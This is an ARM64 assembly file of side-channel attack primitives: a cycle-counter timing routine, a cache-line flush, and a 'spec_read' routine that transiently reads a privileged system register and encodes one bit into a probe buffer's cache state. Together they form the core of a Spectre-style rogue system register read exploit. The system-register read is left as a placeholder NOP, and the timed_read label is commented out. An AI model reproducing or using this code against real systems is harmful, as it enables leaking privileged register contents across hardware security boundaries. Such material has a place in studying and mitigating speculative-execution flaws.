.global timed_read
.func timed_read
//timed_read:
  MRS X1, CNTVCT_EL0
  DSB SY
  NOP
  ADD X3, X4, X5
ADD X3, X4, X5
ADD X3, X4, X5
ADD X3, X4, X5
ADD X3, X4, X5
ADD X3, X4, X5
ADD X3, X4, X5
ADD X3, X4, X5
ADD X3, X4, X5
ADD X3, X4, X5
ADD X3, X4, X5
ADD X3, X4, X5
ADD X3, X4, X5
ADD X3, X4, X5
ADD X3, X4, X5
ADD X3, X4, X5
ADD X3, X4, X5
ADD X3, X4, X5
ADD X3, X4, X5
  MRS X2, CNTVCT_EL0
  SUB X0, X2, X1
  RET
.endfunc

.global line_flush
.func line_flush
line_flush:
  DC CIVAC, X0
  DSB SY
  DMB SY
  ISB SY
  RET
.endfunc

// void spec_read(void *probe_buf, void *miss_buf, int bit);
.global spec_read
.func
spec_read:
  LDR X1, [X1]
  LDR X1, [X1]
  LDR X1, [X1]
  LDR X1, [X1]
  LDR X1, [X1]
  NOP // replaced with MRS X3, SYSTEM_REG
  LSR X3, X3, X2
  AND X3, X3, #1
  ADD X0, X0, X3, LSL #12
  LDR X0, [X0]

  RET
.endfunc
